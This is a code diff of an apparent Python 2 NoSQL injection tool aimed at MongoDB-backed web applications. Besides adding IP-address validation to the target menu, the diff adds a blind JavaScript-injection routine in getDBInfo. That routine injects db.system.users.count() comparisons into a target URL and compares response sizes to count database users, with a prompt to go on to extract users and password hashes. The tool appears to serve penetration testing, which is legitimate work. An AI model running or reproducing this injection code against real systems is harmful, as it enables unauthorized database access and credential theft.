@@ -137,9 +137,36 @@ def options():
 		select = raw_input("Select an option: ")
 		
 		if select == "1":
-			victim = raw_input("Enter the host IP/DNS name: ")
-			print "\nTarget set to " + victim + "\n"
-			optionSet[0] = True
+			#Unset the boolean since we're setting it again.
+			optionSet[0] = False
+			goodLen = False
+			goodDigits = False
+			while optionSet[0] == False:
+				victim = raw_input("Enter the host IP/DNS name: ")
+				#make sure we got a valid IP
+				octets = victim.split(".")
+				#If there aren't 4 octets, toss an error.
+				if len(octets) != 4:
+					print "Invalid IP length."
+				
+				else:
+					goodLen = True
+				
+				if goodLen == True:	
+				#If the format of the IP is good, check and make sure the octets are all within acceptable ranges.
+					for item in octets:
+						if int(item) < 0 or int(item) > 255:
+							print "Bad octet in IP address."
+							goodDigits = False
+						
+						else:
+							goodDigits = True
+						
+				
+				#If everything checks out set the IP and break the loop
+				if goodLen == True and goodDigits == True:
+					print "\nTarget set to " + victim + "\n"
+					optionSet[0] = True
 			options()
 			
 		elif select == "2":
@@ -719,7 +746,7 @@ def webApps():
 		else:
 			print "Integer attack-Unsuccessful"
 		
-		fileOut = raw_input("Save results to file?")
+		fileOut = raw_input("Save results to file? ")
 		
 		if fileOut == "y" or fileOut == "Y":
 			savePath = raw_input("Enter output file name: ")
@@ -1080,9 +1107,11 @@ def getDBInfo():
 	gotDbName = False
 	gotColLen = False
 	gotColName = False
+	gotUserCnt = False
 	dbName = ""
 	charCounter = 0
 	nameCounter = 0
+	usrCount = 0
 	chars = string.ascii_letters + string.digits
 	print "Getting baseline True query return size..."
 	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
@@ -1127,7 +1156,24 @@ def getDBInfo():
 		
 		else:
 			charCounter += 1
-	print "\n"	
+	print "\n"
+	
+	getUserInf = raw_input("Get database users and password hashes? ")
+	
+	if getUserInf == "y" or getUserInf == "Y":
+		while gotUserCnt == False:
+			usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
+			lenUri = int(len(urllib.urlopen(usrCntUri).read()))
+		
+			if lenUri == baseLen:
+				print "Found " + str(usrCount) + " user(s)."
+				gotUserCnt = True
+			
+			else:
+				usrCount += 1
+		
+		
+			
 	raw_input("Press enter to continue...")
 
 mainMenu()
